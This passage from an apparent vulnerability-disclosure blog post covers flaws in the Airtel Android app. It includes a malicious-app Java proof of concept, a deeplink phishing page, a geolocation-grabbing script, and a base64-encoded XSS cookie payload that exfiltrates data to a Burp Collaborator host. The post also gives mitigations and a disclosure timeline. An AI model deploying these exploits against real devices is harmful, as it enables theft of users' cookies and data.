</span></span></code></pre></div><p>The exploit app executes the command <code>chmod -R 777 /data/user/0/com.myairtelapp</code> in the context of the Airtel application, which makes the Airtel app local directory (<code>/data/user/0/com.myairtelapp</code>) to world readable and writeable. Thus, allowing any application on the non-rooted device to access the user&rsquo;s sensitive files located in the Airtel application directory.</p><p><img loading=lazy src=/img/airtel/chmod.png alt=chmod></p><p>If a malicious application exploits this vulnerability, it can gain code execution inside the application and have the same access as the vulnerable application.</p><h2 id=lack-of-host-validation>Lack of Host Validation<a hidden class=anchor aria-hidden=true href=#lack-of-host-validation>#</a></h2><p>A deeplink feature in the Airtel application failed to validate the requested endpoint. A specially crafted request from a website or a third-party app on the device could trigger the deeplink and redirect the user to a specific destination.</p><h3 id=loading-arbitrary-urls-in-webview>Loading Arbitrary URL&rsquo;s in WebView<a hidden class=anchor aria-hidden=true href=#loading-arbitrary-urls-in-webview>#</a></h3><p>The android app registers the scheme <code>myairtel</code> and host <code>app</code> as shown in AndroidManifest.xml file.</p><p><code>AndroidManifest.xml</code>:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-xml data-lang=xml><span class=line><span class=cl><span class=nt>&lt;activity</span> <span class=na>android:theme=</span><span class=s>&#34;@style/AppThemeMain&#34;</span> <span class=na>android:name=</span><span class=s>&#34;com.myairtelapp.activity.SplashScreenActivity&#34;</span> <span class=na>android:launchMode=</span><span class=s>&#34;singleTask&#34;</span> <span class=na>android:screenOrientation=</span><span class=s>&#34;portrait&#34;</span><span class=nt>&gt;</span>
</span></span><span class=line><span class=cl>            <span class=nt>&lt;intent-filter&gt;</span>
</span></span><span class=line><span class=cl>                <span class=nt>&lt;action</span> <span class=na>android:name=</span><span class=s>&#34;android.intent.action.MAIN&#34;</span><span class=nt>/&gt;</span>
</span></span><span class=line><span class=cl>                <span class=nt>&lt;category</span> <span class=na>android:name=</span><span class=s>&#34;android.intent.category.LAUNCHER&#34;</span><span class=nt>/&gt;</span>
</span></span><span class=line><span class=cl>            <span class=nt>&lt;/intent-filter&gt;</span>
</span></span><span class=line><span class=cl>            <span class=nt>&lt;intent-filter&gt;</span>
</span></span><span class=line><span class=cl>                <span class=nt>&lt;action</span> <span class=na>android:name=</span><span class=s>&#34;android.intent.action.VIEW&#34;</span><span class=nt>/&gt;</span>
</span></span><span class=line><span class=cl>                <span class=nt>&lt;category</span> <span class=na>android:name=</span><span class=s>&#34;android.intent.category.DEFAULT&#34;</span><span class=nt>/&gt;</span>
</span></span><span class=line><span class=cl>                <span class=nt>&lt;category</span> <span class=na>android:name=</span><span class=s>&#34;android.intent.category.BROWSABLE&#34;</span><span class=nt>/&gt;</span>
</span></span><span class=line><span class=cl>                <span class=nt>&lt;data</span> <span class=na>android:scheme=</span><span class=s>&#34;http&#34;</span> <span class=na>android:host=</span><span class=s>&#34;www.airtel.in&#34;</span><span class=nt>/&gt;</span>
</span></span><span class=line><span class=cl>                <span class=nt>&lt;data</span> <span class=na>android:scheme=</span><span class=s>&#34;http&#34;</span> <span class=na>android:host=</span><span class=s>&#34;airtel.in&#34;</span><span class=nt>/&gt;</span>
</span></span><span class=line><span class=cl>                <span class=nt>&lt;data</span> <span class=na>android:scheme=</span><span class=s>&#34;http&#34;</span> <span class=na>android:host=</span><span class=s>&#34;www.airtel.in&#34;</span><span class=nt>/&gt;</span>
</span></span><span class=line><span class=cl>                <span class=nt>&lt;data</span> <span class=na>android:scheme=</span><span class=s>&#34;https&#34;</span> <span class=na>android:host=</span><span class=s>&#34;airtel.in&#34;</span><span class=nt>/&gt;</span>
</span></span><span class=line><span class=cl>                <span class=nt>&lt;data</span> <span class=na>android:scheme=</span><span class=s>&#34;https&#34;</span> <span class=na>android:host=</span><span class=s>&#34;www.airtel.in&#34;</span><span class=nt>/&gt;</span>
</span></span><span class=line><span class=cl>                <span class=nt>&lt;data</span> <span class=na>android:scheme=</span><span class=s>&#34;https&#34;</span> <span class=na>android:host=</span><span class=s>&#34;pay1.airtel.in&#34;</span><span class=nt>/&gt;</span>
</span></span><span class=line><span class=cl>                <span class=nt>&lt;data</span> <span class=na>android:scheme=</span><span class=s>&#34;https&#34;</span> <span class=na>android:host=</span><span class=s>&#34;www.pay1.airtel.in&#34;</span><span class=nt>/&gt;</span>
</span></span><span class=line><span class=cl>                <span class=nt>&lt;data</span> <span class=na>android:scheme=</span><span class=s>&#34;myairtel&#34;</span> <span class=na>android:host=</span><span class=s>&#34;app&#34;</span><span class=nt>/&gt;</span>
</span></span><span class=line><span class=cl>            <span class=nt>&lt;/intent-filter&gt;</span>
</span></span><span class=line><span class=cl><span class=nt>&lt;/activity&gt;</span>
</span></span></code></pre></div><p>Several classes parsed the deeplink without adding any host validation check. Shown below is an example taken from one of the class.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-java data-lang=java><span class=line><span class=cl><span class=nd>@butterknife.OnClick</span>
</span></span><span class=line><span class=cl>    <span class=kd>public</span> <span class=kt>void</span> <span class=nf>onClickQuickAction</span><span class=o>(</span><span class=n>android</span><span class=o>.</span><span class=na>view</span><span class=o>.</span><span class=na>View</span> <span class=n>view</span><span class=o>)</span> <span class=o>{</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=o>(</span><span class=k>this</span><span class=o>.</span><span class=na>f48144g</span> <span class=o>!=</span> <span class=kc>null</span><span class=o>)</span> <span class=o>{</span>
</span></span><span class=line><span class=cl>            <span class=k>switch</span> <span class=o>(</span><span class=n>view</span><span class=o>.</span><span class=na>getId</span><span class=o>())</span> <span class=o>{</span>
</span></span><span class=line><span class=cl>                <span class=k>case</span> <span class=n>2131366197</span><span class=o>:</span>
</span></span><span class=line><span class=cl><span class=o>&lt;..</span><span class=na>snipped</span><span class=o>..&gt;</span>
</span></span><span class=line><span class=cl>                <span class=k>case</span> <span class=n>2131366198</span><span class=o>:</span>
</span></span><span class=line><span class=cl>                    <span class=n>com</span><span class=o>.</span><span class=na>myairtelapp</span><span class=o>.</span><span class=na>navigator</span><span class=o>.</span><span class=na>AppNavigator</span><span class=o>.</span><span class=na>navigate</span><span class=o>(</span><span class=k>this</span><span class=o>.</span><span class=na>f48144g</span><span class=o>,</span> <span class=n>android</span><span class=o>.</span><span class=na>net</span><span class=o>.</span><span class=na>Uri</span><span class=o>.</span><span class=na>parse</span><span class=o>(</span><span class=s>&#34;myairtel://webview?au=https%3A%2F%2Fwww.airtel.com&amp;type=merchant&#34;</span><span class=o>));</span>
</span></span><span class=line><span class=cl>                    <span class=n>p003b</span><span class=o>.</span><span class=na>p004a</span><span class=o>.</span><span class=na>b0</span><span class=o>.</span><span class=na>p047k</span><span class=o>.</span><span class=na>EnumC1357b</span> <span class=n>bVar2</span> <span class=o>=</span> <span class=n>p003b</span><span class=o>.</span><span class=na>p004a</span><span class=o>.</span><span class=na>b0</span><span class=o>.</span><span class=na>p047k</span><span class=o>.</span><span class=na>EnumC1357b</span><span class=o>.</span><span class=na>TopRight_AvlBalance_Hotels</span><span class=o>;</span>
</span></span><span class=line><span class=cl>                    <span class=n>p003b</span><span class=o>.</span><span class=na>p725v</span><span class=o>.</span><span class=na>p734b</span><span class=o>.</span><span class=na>p764d</span><span class=o>.</span><span class=na>p796k</span><span class=o>.</span><span class=na>p816t</span><span class=o>.</span><span class=na>C10757j3</span><span class=o>.</span><span class=na>Y1</span><span class=o>(</span><span class=kc>true</span><span class=o>,</span> <span class=s>&#34;TopRight_AvlBalance_Hotels&#34;</span><span class=o>,</span> <span class=kc>null</span><span class=o>);</span>
</span></span><span class=line><span class=cl>                    <span class=k>break</span><span class=o>;</span>
</span></span><span class=line><span class=cl><span class=o>&lt;..</span><span class=na>snipped</span><span class=o>..&gt;</span>
</span></span></code></pre></div><p>Due to insufficient URL validation, it is possible to load any arbitrary URL in the webview.</p><p>The deeplink can be triggered by embedding it into the HTML form as shown below:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-html data-lang=html><span class=line><span class=cl><span class=p>&lt;</span><span class=nt>html</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl><span class=p>&lt;</span><span class=nt>head</span><span class=p>&gt;&lt;</span><span class=nt>title</span><span class=p>&gt;</span>Deeplink<span class=p>&lt;/</span><span class=nt>title</span><span class=p>&gt;&lt;/</span><span class=nt>head</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl><span class=p>&lt;</span><span class=nt>body</span> <span class=na>style</span><span class=o>=</span><span class=s>&#34;text-align: center;&#34;</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl><span class=p>&lt;</span><span class=nt>h1</span><span class=p>&gt;&lt;</span><span class=nt>a</span> <span class=na>href</span><span class=o>=</span><span class=s>&#34;myairtel://app/webview?au=https://www.example.com&#34;</span><span class=p>&gt;</span>Click here<span class=p>&lt;/</span><span class=nt>a</span><span class=p>&gt;&lt;/</span><span class=nt>h1</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl><span class=p>&lt;/</span><span class=nt>body</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl><span class=p>&lt;/</span><span class=nt>html</span><span class=p>&gt;</span>
</span></span></code></pre></div><p>As shown in the screenshot below, the URL <a href=https://www.example.com>https://www.example.com</a> is loaded in the target application’s webview.</p><p><img loading=lazy src=/img/airtel/example.png alt=example></p><p>Therefore, a remote attacker or malicious third-party websites can embed this deeplink in webpages to perform phishing attack and can also use it to steal sensitive header values as shown below:</p><p><img loading=lazy src=/img/airtel/headers.png alt=headers></p><h3 id=stealing-geolocation-data>Stealing Geolocation Data<a hidden class=anchor aria-hidden=true href=#stealing-geolocation-data>#</a></h3><p>Due to the WebView settings <code>JavaScriptEnabled</code> and <code>setGeolocationEnabled</code> set to <code>True</code>, it was possible to execute Javascript and steal user&rsquo;s geolocation data.
The following payload was used:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-javascript data-lang=javascript><span class=line><span class=cl><span class=kd>function</span> <span class=nx>geoFindMe</span><span class=p>()</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=kr>const</span> <span class=nx>status</span> <span class=o>=</span> <span class=nb>document</span><span class=p>.</span><span class=nx>querySelector</span><span class=p>(</span><span class=s1>&#39;#status&#39;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=kr>const</span> <span class=nx>mapLink</span> <span class=o>=</span> <span class=nb>document</span><span class=p>.</span><span class=nx>querySelector</span><span class=p>(</span><span class=s1>&#39;#map-link&#39;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=nx>mapLink</span><span class=p>.</span><span class=nx>href</span> <span class=o>=</span> <span class=s1>&#39;&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=nx>mapLink</span><span class=p>.</span><span class=nx>textContent</span> <span class=o>=</span> <span class=s1>&#39;&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=kd>function</span> <span class=nx>success</span><span class=p>(</span><span class=nx>position</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=kr>const</span> <span class=nx>latitude</span>  <span class=o>=</span> <span class=nx>position</span><span class=p>.</span><span class=nx>coords</span><span class=p>.</span><span class=nx>latitude</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=kr>const</span> <span class=nx>longitude</span> <span class=o>=</span> <span class=nx>position</span><span class=p>.</span><span class=nx>coords</span><span class=p>.</span><span class=nx>longitude</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=nx>status</span><span class=p>.</span><span class=nx>textContent</span> <span class=o>=</span> <span class=s1>&#39;&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=nx>mapLink</span><span class=p>.</span><span class=nx>href</span> <span class=o>=</span> <span class=sb>`https://www.openstreetmap.org/#map=18/</span><span class=si>${</span><span class=nx>latitude</span><span class=si>}</span><span class=sb>/</span><span class=si>${</span><span class=nx>longitude</span><span class=si>}</span><span class=sb>`</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=nx>mapLink</span><span class=p>.</span><span class=nx>textContent</span> <span class=o>=</span> <span class=sb>`Latitude: </span><span class=si>${</span><span class=nx>latitude</span><span class=si>}</span><span class=sb> °, Longitude: </span><span class=si>${</span><span class=nx>longitude</span><span class=si>}</span><span class=sb> °`</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=kd>function</span> <span class=nx>error</span><span class=p>()</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=nx>status</span><span class=p>.</span><span class=nx>textContent</span> <span class=o>=</span> <span class=s1>&#39;Unable to retrieve your location&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=k>if</span> <span class=p>(</span><span class=o>!</span><span class=nx>navigator</span><span class=p>.</span><span class=nx>geolocation</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=nx>status</span><span class=p>.</span><span class=nx>textContent</span> <span class=o>=</span> <span class=s1>&#39;Geolocation is not supported by your browser&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=p>}</span> <span class=k>else</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=nx>status</span><span class=p>.</span><span class=nx>textContent</span> <span class=o>=</span> <span class=s1>&#39;Locating…&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=nx>navigator</span><span class=p>.</span><span class=nx>geolocation</span><span class=p>.</span><span class=nx>getCurrentPosition</span><span class=p>(</span><span class=nx>success</span><span class=p>,</span> <span class=nx>error</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nb>document</span><span class=p>.</span><span class=nx>querySelector</span><span class=p>(</span><span class=s1>&#39;#find-me&#39;</span><span class=p>).</span><span class=nx>addEventListener</span><span class=p>(</span><span class=s1>&#39;click&#39;</span><span class=p>,</span> <span class=nx>geoFindMe</span><span class=p>);</span>
</span></span></code></pre></div><p><img loading=lazy src=/img/airtel/geo.png alt=geo></p><h3 id=theft-of-cookies-via-symlink-attack>Theft of cookies via Symlink attack<a hidden class=anchor aria-hidden=true href=#theft-of-cookies-via-symlink-attack>#</a></h3><p><em>The following attack is only exploitable on Android devices running version Marshmallow or before.</em></p><p>Here&rsquo;s the exploit in action:</p><p><img loading=lazy src=/img/airtel/airtel-theft.mp4 alt=video></p><p>The WebView had <code>setJavaScriptEnabled(true)</code> and <code>setAllowFileAccess(true</code>) flags set, which could allow an attacker to execute JavaScript and load protected files from the application sandbox.</p><p>The main idea is to set a cookie with an XSS payload that sends current document contents to an external server. A symlink with a .html extension to the database file is created, and WebView is forced to open the symlink. SQLite database file will be parsed as an HTML document, XSS will trigger and leak all the data from the database to the attacker-controlled domain.
As shown in the following screenshot, it was possible to exfiltrate the data from the SQLite database to the attacker-controlled domain (Burp Collaborator in this case).</p><p>A malicious android application on the user&rsquo;s device can contain the following code:</p><p><code>Mainactivity.java</code>:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-java data-lang=java><span class=line><span class=cl><span class=kd>public</span> <span class=kd>class</span> <span class=nc>MainActivity</span> <span class=kd>extends</span> <span class=n>AppCompatActivity</span> <span class=o>{</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=kd>private</span> <span class=kd>static</span> <span class=kd>final</span> <span class=n>String</span> <span class=n>APP</span> <span class=o>=</span> <span class=s>&#34;com.myairtelapp&#34;</span><span class=o>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=kd>protected</span> <span class=kt>void</span> <span class=nf>onCreate</span><span class=o>(</span><span class=n>Bundle</span> <span class=n>savedInstanceState</span><span class=o>)</span> <span class=o>{</span>
</span></span><span class=line><span class=cl>        <span class=kd>super</span><span class=o>.</span><span class=na>onCreate</span><span class=o>(</span><span class=n>savedInstanceState</span><span class=o>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=n>launch</span><span class=o>(</span><span class=s>&#34;http://[IP]:[Port]/set_cookies.html&#34;</span><span class=o>);</span>
</span></span><span class=line><span class=cl>        <span class=k>new</span> <span class=n>Handler</span><span class=o>().</span><span class=na>postDelayed</span><span class=o>(()</span> <span class=o>-&gt;</span> <span class=n>launch</span><span class=o>(</span><span class=s>&#34;file://&#34;</span> <span class=o>+</span> <span class=n>symlink</span><span class=o>()),</span> <span class=n>45000</span><span class=o>);</span>
</span></span><span class=line><span class=cl>    <span class=o>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=kd>private</span> <span class=kt>void</span> <span class=nf>launch</span><span class=o>(</span><span class=n>String</span> <span class=n>url</span><span class=o>)</span> <span class=o>{</span>
</span></span><span class=line><span class=cl>        <span class=n>Intent</span> <span class=n>intent</span> <span class=o>=</span> <span class=k>new</span> <span class=n>Intent</span><span class=o>();</span>
</span></span><span class=line><span class=cl>        <span class=n>intent</span><span class=o>.</span><span class=na>setData</span><span class=o>(</span><span class=n>Uri</span><span class=o>.</span><span class=na>parse</span><span class=o>(</span><span class=s>&#34;myairtel://app/webview?au=&#34;</span><span class=o>+</span><span class=n>url</span><span class=o>));</span>
</span></span><span class=line><span class=cl>        <span class=n>startActivity</span><span class=o>(</span><span class=n>intent</span><span class=o>);</span>
</span></span><span class=line><span class=cl>    <span class=o>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=kd>private</span> <span class=n>String</span> <span class=nf>symlink</span><span class=o>()</span> <span class=o>{</span>
</span></span><span class=line><span class=cl>        <span class=k>try</span> <span class=o>{</span>
</span></span><span class=line><span class=cl>            <span class=n>String</span> <span class=n>root</span> <span class=o>=</span> <span class=n>getApplicationInfo</span><span class=o>().</span><span class=na>dataDir</span><span class=o>;</span>
</span></span><span class=line><span class=cl>            <span class=n>String</span> <span class=n>symlink</span> <span class=o>=</span> <span class=n>root</span> <span class=o>+</span> <span class=s>&#34;/symlink.html&#34;</span><span class=o>;</span>
</span></span><span class=line><span class=cl>            <span class=n>String</span> <span class=n>cookies</span> <span class=o>=</span> <span class=n>getPackageManager</span><span class=o>().</span><span class=na>getApplicationInfo</span><span class=o>(</span><span class=n>APP</span><span class=o>,</span> <span class=n>0</span><span class=o>).</span><span class=na>dataDir</span> <span class=o>+</span> <span class=s>&#34;/app_webview/Cookies&#34;</span><span class=o>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>            <span class=n>Runtime</span><span class=o>.</span><span class=na>getRuntime</span><span class=o>().</span><span class=na>exec</span><span class=o>(</span><span class=s>&#34;ln -s &#34;</span> <span class=o>+</span> <span class=n>cookies</span> <span class=o>+</span> <span class=s>&#34; &#34;</span> <span class=o>+</span> <span class=n>symlink</span><span class=o>).</span><span class=na>waitFor</span><span class=o>();</span>
</span></span><span class=line><span class=cl>            <span class=n>Runtime</span><span class=o>.</span><span class=na>getRuntime</span><span class=o>().</span><span class=na>exec</span><span class=o>(</span><span class=s>&#34;chmod -R 777 &#34;</span> <span class=o>+</span> <span class=n>root</span><span class=o>).</span><span class=na>waitFor</span><span class=o>();</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>            <span class=k>return</span> <span class=n>symlink</span><span class=o>;</span>
</span></span><span class=line><span class=cl>        <span class=o>}</span>
</span></span><span class=line><span class=cl>        <span class=k>catch</span> <span class=o>(</span><span class=n>Throwable</span> <span class=n>th</span><span class=o>)</span> <span class=o>{</span>
</span></span><span class=line><span class=cl>            <span class=k>throw</span> <span class=k>new</span> <span class=n>RuntimeException</span><span class=o>(</span><span class=n>th</span><span class=o>);</span>
</span></span><span class=line><span class=cl>        <span class=o>}</span>
</span></span><span class=line><span class=cl>    <span class=o>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=o>}</span>
</span></span></code></pre></div><p>The above code creates a symlink and then calls set_cookies.html file. The set_cookies.html file contains reference to the attacker server (burp collaborator in this case).</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-html data-lang=html><span class=line><span class=cl><span class=p>&lt;</span><span class=nt>html</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl><span class=p>&lt;</span><span class=nt>body</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl><span class=p>&lt;</span><span class=nt>h1</span><span class=p>&gt;</span>Symlink in work...Please Wait!!<span class=p>&lt;/</span><span class=nt>h1</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl><span class=p>&lt;</span><span class=nt>script</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl><span class=nb>document</span><span class=p>.</span><span class=nx>cookie</span> <span class=o>=</span> <span class=s2>&#34;x = &#39;&lt;img src=\&#34;x\&#34; onerror=\&#34;eval(atob(&#39;dmFyIGltZyA9IGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoImltZyIpOwppbWcuc3JjID0gImh0dHA6Ly9mYnV6Nmlhd3B6cjU3bTgyNTN4NjJvY2N6MzV0dGkuYnVycGNvbGxhYm9yYXRvci5uZXQvc3RlYWwuanBnP3B3bj0iICsgZW5jb2RlVVJJQ29tcG9uZW50KGRvY3VtZW50LmdldEVsZW1lbnRzQnlUYWdOYW1lKCJodG1sIilbMF0uaW5uZXJIVE1MKTs=&#39;))\&#34;&gt;&#39;&#34;</span>
</span></span><span class=line><span class=cl><span class=p>&lt;/</span><span class=nt>script</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl><span class=p>&lt;/</span><span class=nt>body</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl><span class=p>&lt;/</span><span class=nt>html</span><span class=p>&gt;</span>
</span></span></code></pre></div><p>The HTML file executes javascript and sends sqlite database file (cookies.db) using XmlHTTPRequest to our burp collaborator domain.</p><p>The following screenshot shows the SQLiteDB file from Airtel app sent to the remote domain.</p><p><img loading=lazy src=/img/airtel/symlink.png alt=symlink></p><h2 id=mitigating-these-vulnerabilities>Mitigating these vulnerabilities<a hidden class=anchor aria-hidden=true href=#mitigating-these-vulnerabilities>#</a></h2><ul><li><p>It is important to make sure that all the libraries consumed by the mobile application must be updated regularly. Google released the <a href=https://developer.android.com/reference/com/google/android/play/core/release-notes#1-7-2>CVE-2020-8913</a> advisory in March 2020 notifying customers about a code execution bug.</p></li><li><p>Several mobile applications do not implement a proper host validation, thus allowing attackers or malware to load arbitrary content in WebView. It is important to restrict unwanted websites to be loaded within the mobile application. If that is a requirement, make sure to restrict WebView properties that allows executing JavaScript, fetching local files via <code>file://</code> or <code>content://</code> scheme and fetching geolocation coordinates.</p></li></ul><h2 id=disclosure-timelines>Disclosure Timelines<a hidden class=anchor aria-hidden=true href=#disclosure-timelines>#</a></h2><ul><li><p>Regarding the code execution bug, Airtel was contacted in January 2021 via email. After several unsuccessful attempts in receiving any response via mail, a concerned authority from their security team was informed on social media channel that their Airtel Thanks app is consuming a vulnerable library. Airtel responded via email on 3rd September 2021 that they are investigating this issue. The issue was fixed by Airtel on 7th September 2021.</p></li><li><p>Host validation issue was reported to Airtel in January 2021 via email. Airtel confirmed this issue in March 2021. This has been fixed and the vulnerability can no longer be reproduced in Airtel Thanks version <code>4.54.1</code> released in September 2022.</p></li></ul></div><footer class=post-footer><ul class=post-tags><li><a href=https://offsec.space/tags/android/>Android</a></li><li><a href=https://offsec.space/tags/bug-bounty/>bug bounty</a></li></ul><nav class=paginav><a class=next href=https://offsec.space/posts/introducing-insecureshop/><span class=title>Next »</span><br><span>Introducing InsecureShop</span></a></nav><div class=share-buttons><a target=_blank rel="noopener noreferrer" aria-label="share Multiple Vulnerabilities found in Airtel Android Application on twitter" href="https://twitter.com/intent/tweet/?text=Multiple%20Vulnerabilities%20found%20in%20Airtel%20Android%20Application&url=https%3a%2f%2foffsec.space%2fposts%2fairtel-vulnerabilities%2f&hashtags=Android%2cbugbounty"><svg viewBox="0 0 512 512" height="30" width="30" fill="currentcolor"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM195.519 424.544c135.939.0 210.268-112.643 210.268-210.268.0-3.218.0-6.437-.153-9.502 14.406-10.421 26.973-23.448 36.935-38.314-13.18 5.824-27.433 9.809-42.452 11.648 15.326-9.196 26.973-23.602 32.49-40.92-14.252 8.429-30.038 14.56-46.896 17.931-13.487-14.406-32.644-23.295-53.946-23.295-40.767.0-73.87 33.104-73.87 73.87.0 5.824.613 11.494 1.992 16.858-61.456-3.065-115.862-32.49-152.337-77.241-6.284 10.881-9.962 23.601-9.962 37.088.0 25.594 13.027 48.276 32.95 61.456-12.107-.307-23.448-3.678-33.41-9.196v.92c0 35.862 25.441 65.594 59.311 72.49-6.13 1.686-12.72 2.606-19.464 2.606-4.751.0-9.348-.46-13.946-1.38 9.349 29.426 36.628 50.728 68.965 51.341-25.287 19.771-57.164 31.571-91.8 31.571-5.977.0-11.801-.306-17.625-1.073 32.337 21.15 71.264 33.41 112.95 33.41z"/></svg></a><a target=_blank rel="noopener noreferrer" aria-label="share Multiple Vulnerabilities found in Airtel Android Application on linkedin" href="https://www.linkedin.com/shareArticle?mini=true&url=https%3a%2f%2foffsec.space%2fposts%2fairtel-vulnerabilities%2f&title=Multiple%20Vulnerabilities%20found%20in%20Airtel%20Android%20Application&summary=Multiple%20Vulnerabilities%20found%20in%20Airtel%20Android%20Application&source=https%3a%2f%2foffsec.space%2fposts%2fairtel-vulnerabilities%2f"><svg viewBox="0 0 512 512" height="30" width="30" fill="currentcolor"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM160.461 423.278V197.561h-75.04v225.717h75.04zm270.539.0V293.839c0-69.333-37.018-101.586-86.381-101.586-39.804.0-57.634 21.891-67.617 37.266v-31.958h-75.021c.995 21.181.0 225.717.0 225.717h75.02V297.222c0-6.748.486-13.492 2.474-18.315 5.414-13.475 17.767-27.434 38.494-27.434 27.135.0 38.007 20.707 38.007 51.037v120.768H431zM123.448 88.722C97.774 88.722 81 105.601 81 127.724c0 21.658 16.264 39.002 41.455 39.002h.484c26.165.0 42.452-17.344 42.452-39.002-.485-22.092-16.241-38.954-41.943-39.002z"/></svg></a><a target=_blank rel="noopener noreferrer" aria-label="share Multiple Vulnerabilities found in Airtel Android Application on reddit" href="https://reddit.com/submit?url=https%3a%2f%2foffsec.space%2fposts%2fairtel-vulnerabilities%2f&title=Multiple%20Vulnerabilities%20found%20in%20Airtel%20Android%20Application"><svg viewBox="0 0 512 512" height="30" width="30" fill="currentcolor"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM446 265.638c0-22.964-18.616-41.58-41.58-41.58-11.211.0-21.361 4.457-28.841 11.666-28.424-20.508-67.586-33.757-111.204-35.278l18.941-89.121 61.884 13.157c.756 15.734 13.642 28.29 29.56 28.29 16.407.0 29.706-13.299 29.706-29.701.0-16.403-13.299-29.702-29.706-29.702-11.666.0-21.657 6.792-26.515 16.578l-69.105-14.69c-1.922-.418-3.939-.042-5.585 1.036-1.658 1.073-2.811 2.761-3.224 4.686l-21.152 99.438c-44.258 1.228-84.046 14.494-112.837 35.232-7.468-7.164-17.589-11.591-28.757-11.591-22.965.0-41.585 18.616-41.585 41.58.0 16.896 10.095 31.41 24.568 37.918-.639 4.135-.99 8.328-.99 12.576.0 63.977 74.469 115.836 166.33 115.836s166.334-51.859 166.334-115.836c0-4.218-.347-8.387-.977-12.493 14.564-6.47 24.735-21.034 24.735-38.001zM326.526 373.831c-20.27 20.241-59.115 21.816-70.534 21.816-11.428.0-50.277-1.575-70.522-21.82-3.007-3.008-3.007-7.882.0-10.889 3.003-2.999 7.882-3.003 10.885.0 12.777 12.781 40.11 17.317 59.637 17.317 19.522.0 46.86-4.536 59.657-17.321 3.016-2.999 7.886-2.995 10.885.008 3.008 3.011 3.003 7.882-.008 10.889zm-5.23-48.781c-16.373.0-29.701-13.324-29.701-29.698.0-16.381 13.328-29.714 29.701-29.714 16.378.0 29.706 13.333 29.706 29.714.0 16.374-13.328 29.698-29.706 29.698zM160.91 295.348c0-16.381 13.328-29.71 29.714-29.71 16.369.0 29.689 13.329 29.689 29.71.0 16.373-13.32 29.693-29.689 29.693-16.386.0-29.714-13.32-29.714-29.693z"/></svg></a><a target=_blank rel="noopener noreferrer" aria-label="share Multiple Vulnerabilities found in Airtel Android Application on facebook" href="https://facebook.com/sharer/sharer.php?u=https%3a%2f%2foffsec.space%2fposts%2fairtel-vulnerabilities%2f"><svg viewBox="0 0 512 512" height="30" width="30" fill="currentcolor"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H342.978V319.085h66.6l12.672-82.621h-79.272v-53.617c0-22.603 11.073-44.636 46.58-44.636H425.6v-70.34s-32.71-5.582-63.982-5.582c-65.288.0-107.96 39.569-107.96 111.204v62.971h-72.573v82.621h72.573V512h-191.104c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892z"/></svg></a><a target=_blank rel="noopener noreferrer" 